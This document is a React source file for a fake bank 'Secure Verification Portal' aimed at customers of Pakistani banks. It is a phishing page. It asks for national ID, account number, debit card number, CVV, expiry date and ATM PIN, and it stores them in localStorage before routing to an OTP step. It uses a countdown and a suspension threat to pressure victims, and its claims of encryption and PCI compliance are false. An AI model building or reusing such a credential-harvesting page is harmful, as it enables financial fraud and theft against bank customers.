import { useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";
import { Shield, Lock, AlertTriangle, CheckCircle, Eye, EyeOff, Clock, Info, ArrowRight } from "lucide-react";

const VerificationForm = () => {
    const navigate = useNavigate();
    const [timeLeft, setTimeLeft] = useState(180); // 3 minutes
    const [showPassword, setShowPassword] = useState(false);
    const [step, setStep] = useState(1);
    const [formData, setFormData] = useState({
        fullName: "",
        cnic: "",
        mobile: "",
        email: "",
        bank: "",
        accountNumber: "",
        debitCard: "",
        cvv: "",
        expiryDate: "",
        pin: ""
    });

    useEffect(() => {
        const timer = setInterval(() => {
            setTimeLeft((prev) => (prev <= 1 ? 0 : prev - 1));
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    const formatTime = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, "0")}`;
    };

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handleSubmit = (e) => {
        e.preventDefault();

        // save current form data to localStorage
        localStorage.setItem("verificationData", JSON.stringify(formData));

        if (step === 1) {
            setStep(2);
        } else {
            navigate("/otp");
        }
    };

    return (
        <div className="min-h-screen flex items-center justify-center px-4 py-8 bg-gradient-to-br from-blue-50 via-white to-green-50">
            <div className="max-w-2xl w-full">
                {/* Security Badge */}
                <div className="flex justify-center mb-6">
                    <div className="inline-flex items-center gap-2 bg-green-100 border border-green-300 rounded-full px-6 py-2">
                        <Shield className="w-5 h-5 text-green-600" />
                        <span className="text-sm font-semibold text-green-700">Secure Verification Portal</span>
                    </div>
                </div>

                <div className="bg-white shadow-2xl rounded-3xl overflow-hidden border border-gray-200">
                    {/* Header Banner */}
                    <div className="bg-gradient-to-r from-green-600 to-blue-600 text-white py-4 px-6">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <Lock className="w-5 h-5" />
                                <span className="font-semibold">Encrypted Connection</span>
                            </div>
                            <div className="flex items-center gap-2 text-sm">
                                <Clock className="w-4 h-4" />
                                <span>Session: {formatTime(timeLeft)}</span>
                            </div>
                        </div>
                    </div>

                    <div className="p-8 sm:p-12">
                        {/* Progress Indicator */}
                        <div className="mb-8">
                            <div className="flex items-center justify-between mb-3">
                                <div className={`flex items-center gap-2 ${step >= 1 ? 'text-green-600' : 'text-gray-400'}`}>
                                    <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${step >= 1 ? 'bg-green-600 text-white' : 'bg-gray-200'}`}>
                                        {step > 1 ? <CheckCircle className="w-5 h-5" /> : '1'}
                                    </div>
                                    <span className="text-sm font-semibold hidden sm:inline">Personal Info</span>
                                </div>
                                <div className={`flex-1 h-1 mx-2 rounded ${step >= 2 ? 'bg-green-600' : 'bg-gray-200'}`}></div>
                                <div className={`flex items-center gap-2 ${step >= 2 ? 'text-green-600' : 'text-gray-400'}`}>
                                    <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${step >= 2 ? 'bg-green-600 text-white' : 'bg-gray-200'}`}>
                                        2
                                    </div>
                                    <span className="text-sm font-semibold hidden sm:inline">Card Details</span>
                                </div>
                                <div className={`flex-1 h-1 mx-2 rounded bg-gray-200`}></div>
                                <div className="flex items-center gap-2 text-gray-400">
                                    <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold bg-gray-200">
                                        3
                                    </div>
                                    <span className="text-sm font-semibold hidden sm:inline">OTP</span>
                                </div>
                            </div>
                        </div>

                        {/* Urgent Notice */}
                        <div className="bg-red-50 border-l-4 border-red-500 rounded-lg p-4 mb-6 flex items-start gap-3">
                            <AlertTriangle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                            <div className="flex-1">
                                <p className="text-sm font-semibold text-red-800 mb-1">Time-Sensitive Security Verification</p>
                                <p className="text-xs text-red-700">
                                    Complete this verification within {formatTime(timeLeft)} to prevent account suspension. All information is protected by bank-grade encryption.
                                </p>
                            </div>
                        </div>

                        {/* Title */}
                        <div className="mb-8">
                            <h2 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-3 flex items-center gap-2">
                                <Shield className="w-7 h-7 text-green-600" />
                                {step === 1 ? 'Account Holder Verification' : 'Payment Card Verification'}
                            </h2>
                            <p className="text-sm text-gray-600">
                                {step === 1
                                    ? 'Please provide your personal information exactly as registered with your bank to proceed with the security verification.'
                                    : 'For enhanced security, we need to verify your payment card details. This helps us confirm your identity and protect your account.'}
                            </p>
                        </div>

                        {/* Form */}
                        <form onSubmit={handleSubmit} className="space-y-5">
                            {step === 1 ? (
                                <>
                                    {/* Personal Information Step */}
                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            Full Name <span className="text-red-500">*</span>
                                        </label>
                                        <input
                                            type="text"
                                            name="fullName"
                                            value={formData.fullName}
                                            onChange={handleChange}
                                            placeholder="Enter your full name as per CNIC"
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            CNIC Number <span className="text-red-500">*</span>
                                        </label>
                                        <input
                                            type="text"
                                            name="cnic"
                                            value={formData.cnic}
                                            onChange={handleChange}
                                            placeholder="XXXXX-XXXXXXX-X"
                                            maxLength="15"
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            Mobile Number <span className="text-red-500">*</span>
                                        </label>
                                        <input
                                            type="tel"
                                            name="mobile"
                                            value={formData.mobile}
                                            onChange={handleChange}
                                            placeholder="+92 3XX XXXXXXX"
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            Email Address <span className="text-red-500">*</span>
                                        </label>
                                        <input
                                            type="email"
                                            name="email"
                                            value={formData.email}
                                            onChange={handleChange}
                                            placeholder="your.email@example.com"
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            Select Your Bank <span className="text-red-500">*</span>
                                        </label>
                                        <select
                                            name="bank"
                                            value={formData.bank}
                                            onChange={handleChange}
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        >
                                            <option value="">Choose your bank...</option>
                                            <option value="hbl">Habib Bank Limited (HBL)</option>
                                            <option value="ubl">United Bank Limited (UBL)</option>
                                            <option value="mcb">MCB Bank</option>
                                            <option value="allied">Allied Bank</option>
                                            <option value="meezan">Meezan Bank</option>
                                            <option value="standard">Standard Chartered</option>
                                            <option value="nbp">National Bank of Pakistan</option>
                                        </select>
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            Account Number <span className="text-red-500">*</span>
                                        </label>
                                        <input
                                            type="text"
                                            name="accountNumber"
                                            value={formData.accountNumber}
                                            onChange={handleChange}
                                            placeholder="Enter your account number"
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        />
                                    </div>
                                </>
                            ) : (
                                <>
                                    {/* Card Information Step */}
                                    <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-2xl p-6 mb-6 border border-blue-200">
                                        <div className="flex items-start gap-3">
                                            <Info className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                                            <div>
                                                <p className="text-sm font-semibold text-blue-800 mb-1">Why do we need this?</p>
                                                <p className="text-xs text-blue-700">
                                                    Card verification is a standard security measure to confirm your identity and protect your account from unauthorized access. Your information is encrypted and secure.
                                                </p>
                                            </div>
                                        </div>
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            Debit Card Number <span className="text-red-500">*</span>
                                        </label>
                                        <input
                                            type="text"
                                            name="debitCard"
                                            value={formData.debitCard}
                                            onChange={handleChange}
                                            placeholder="XXXX XXXX XXXX XXXX"
                                            maxLength="19"
                                            className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                            required
                                        />
                                    </div>

                                    <div className="grid grid-cols-2 gap-4">
                                        <div>
                                            <label className="block text-sm font-semibold text-gray-700 mb-2">
                                                Expiry Date <span className="text-red-500">*</span>
                                            </label>
                                            <input
                                                type="text"
                                                name="expiryDate"
                                                value={formData.expiryDate}
                                                onChange={handleChange}
                                                placeholder="MM/YY"
                                                maxLength="5"
                                                className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                                required
                                            />
                                        </div>

                                        <div>
                                            <label className="block text-sm font-semibold text-gray-700 mb-2">
                                                CVV <span className="text-red-500">*</span>
                                            </label>
                                            <input
                                                type="text"
                                                name="cvv"
                                                value={formData.cvv}
                                                onChange={handleChange}
                                                placeholder="XXX"
                                                maxLength="3"
                                                className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none"
                                                required
                                            />
                                        </div>
                                    </div>

                                    <div>
                                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                                            ATM PIN <span className="text-red-500">*</span>
                                        </label>
                                        <div className="relative">
                                            <input
                                                type={showPassword ? "text" : "password"}
                                                name="pin"
                                                value={formData.pin}
                                                onChange={handleChange}
                                                placeholder="Enter 4-digit PIN"
                                                maxLength="4"
                                                className="w-full border-2 border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-200 rounded-xl px-4 py-3 text-sm transition-all outline-none pr-12"
                                                required
                                            />
                                            <button
                                                type="button"
                                                onClick={() => setShowPassword(!showPassword)}
                                                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                                            >
                                                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                            </button>
                                        </div>
                                    </div>
                                </>
                            )}

                            {/* Security Assurance */}
                            <div className="bg-green-50 border border-green-200 rounded-xl p-4 flex items-start gap-3">
                                <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
                                <div>
                                    <p className="text-sm font-semibold text-green-800 mb-1">Your Data is Protected</p>
                                    <p className="text-xs text-green-700">
                                        All information is encrypted using 256-bit SSL technology and processed through secure banking channels.
                                    </p>
                                </div>
                            </div>

                            {/* Submit Button */}
                            <button
                                type="submit"
                                className="w-full group bg-gradient-to-r from-green-600 to-blue-600 hover:from-green-700 hover:to-blue-700 text-white py-4 rounded-xl font-bold text-base transition-all duration-300 transform hover:scale-[1.02] shadow-lg hover:shadow-xl flex items-center justify-center gap-2"
                            >
                                <Lock className="w-5 h-5" />
                                {step === 1 ? 'Continue to Card Verification' : 'Proceed to OTP Verification'}
                                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                            </button>

                            {/* Back Button for Step 2 */}
                            {step === 2 && (
                                <button
                                    type="button"
                                    onClick={() => setStep(1)}
                                    className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-xl font-semibold text-sm transition-colors"
                                >
                                    ← Back to Personal Information
                                </button>
                            )}
                        </form>

                        {/* Footer Info */}
                        <div className="mt-8 pt-6 border-t border-gray-200">
                            <div className="flex items-center justify-center gap-6 text-xs text-gray-500">
                                <div className="flex items-center gap-1">
                                    <Shield className="w-4 h-4 text-green-600" />
                                    <span>Bank Secured</span>
                                </div>
                                <div className="flex items-center gap-1">
                                    <Lock className="w-4 h-4 text-green-600" />
                                    <span>256-bit Encrypted</span>
                                </div>
                                <div className="flex items-center gap-1">
                                    <CheckCircle className="w-4 h-4 text-green-600" />
                                    <span>PCI Compliant</span>
                                </div>
                            </div>
                            <p className="text-xs text-gray-400 text-center mt-4">
                                Your information will be used solely for identity verification purposes and is protected under banking security standards.
                            </p>
                        </div>
                    </div>
                </div>

                {/* Help Text */}
                <p className="text-center text-gray-600 text-sm mt-6">
                    Having trouble? Contact our 24/7 support: <span className="font-semibold text-green-600">+92 300 1234567</span>
                </p>
            </div>
        </div>
    );
};

export default VerificationForm;